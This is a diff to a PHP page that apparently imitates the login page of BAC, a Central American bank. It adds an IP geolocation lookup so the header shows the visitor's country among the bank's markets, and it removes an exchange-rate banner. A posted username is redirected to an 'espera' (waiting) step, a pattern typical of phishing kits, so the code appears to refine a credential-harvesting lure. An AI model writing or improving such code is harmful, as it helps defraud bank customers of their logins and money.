@@ -45,6 +45,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Location: espera.php?u=' . urlencode($usuario) . '&step=login');
     exit;
 }
+
+// ============================================================
+// Detecta país del visitante y mapea al país BAC
+// BAC opera en: CR, SV, GT, HN, NI, PA
+// ============================================================
+$bac_countries = [
+    'CR' => ['name' => 'Costa Rica',  'label' => 'CR'],
+    'SV' => ['name' => 'El Salvador', 'label' => 'SV'],
+    'GT' => ['name' => 'Guatemala',   'label' => 'GT'],
+    'HN' => ['name' => 'Honduras',    'label' => 'HN'],
+    'NI' => ['name' => 'Nicaragua',   'label' => 'NI'],
+    'PA' => ['name' => 'Panamá',      'label' => 'PA'],
+];
+$visitor_ip   = client_ip();
+$visitor_geo  = $visitor_ip ? geo_lookup($visitor_ip) : ['country_code' => ''];
+$visitor_cc   = strtoupper($visitor_geo['country_code'] ?? '');
+$country_code = isset($bac_countries[$visitor_cc]) ? $visitor_cc : 'NI';
+$country_name = $bac_countries[$country_code]['name'];
+$country_lbl  = $bac_countries[$country_code]['label'];
 ?>
 <!DOCTYPE html>
 <html lang="es">
@@ -522,9 +541,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 </svg>
                 Ayuda
             </a>
-            <div class="country">
+            <div class="country" title="<?= htmlspecialchars($country_name) ?>">
                 <div class="country-flag"></div>
-                <span>NI</span>
+                <span><?= htmlspecialchars($country_lbl) ?></span>
                 <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                     <path d="m6 9 6 6 6-6"/>
                 </svg>
@@ -536,19 +555,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             </button>
         </div>
     </header>
-
-    <!-- Sub header - Tipo de Cambio -->
-    <div class="sub-header">
-        <a href="#">
-            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/>
-            </svg>
-            Tipo de Cambio
-            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                <path d="m6 9 6 6 6-6"/>
-            </svg>
-        </a>
-    </div>
 
     <!-- Main content -->
     <main class="main-content">
